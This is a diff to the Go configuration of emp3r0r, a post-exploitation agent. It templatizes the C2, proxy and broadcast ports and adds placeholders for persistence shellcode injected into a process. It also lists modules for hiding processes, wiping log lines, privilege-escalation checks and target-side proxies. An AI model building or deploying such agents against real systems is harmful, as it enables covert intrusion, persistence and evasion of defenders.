@@ -34,14 +34,20 @@ var (
 	// AgentProxy used by this agent to communicate with CC server
 	AgentProxy = ""
 
-	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
-	ProxyPort = "8388"
-
 	// HIDE_PIDS all the processeserr from emp3r0r
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
+
+	// GuardianShellcode inject into a process to gain persistence
+	GuardianShellcode = `[persistence_shellcode]`
+
+	// GuardianAgentPath where the agent binary is stored
+	GuardianAgentPath = "[persistence_agent_path]"
 )
 
 const (
+	// Version record version on build time
+	Version = "[emp3r0r_version_string]"
+
 	// AgentRoot root directory of emp3r0r
 	AgentRoot = "[agent_root]"
 
@@ -58,10 +64,13 @@ const (
 	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
 
 	// CCPort port of c2
-	CCPort = "8000"
+	CCPort = "[cc_port]"
+
+	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
+	ProxyPort = "[proxy_port]"
 
 	// BroadcastPort port of broadcast server
-	BroadcastPort = "8889"
+	BroadcastPort = "[broadcast_port]"
 
 	// CCIndicator check this before trying connection
 	CCIndicator = "[cc_indicator]"
@@ -97,7 +106,7 @@ const (
 var ModuleDocs = map[string]string{
 	ModCMD_EXEC:    "Run a single command on a target",
 	ModCLEAN_LOG:   "Delete lines containing keyword from *tmp logs",
-	ModLPE_SUGGEST: "Run unix-priv-check and linux exploit suggester",
+	ModLPE_SUGGEST: "Run linux-smart-enumeration or linux exploit suggester",
 	ModPERSISTENCE: "Get persistence via built-in methods",
 	ModPROXY:       "Start a socks proxy on target, and use it locally on C2 side",
 	ModPORT_FWD:    "Port mapping from agent to CC (or vice versa), via emp3r0r's HTTP2 (or other) tunnel",
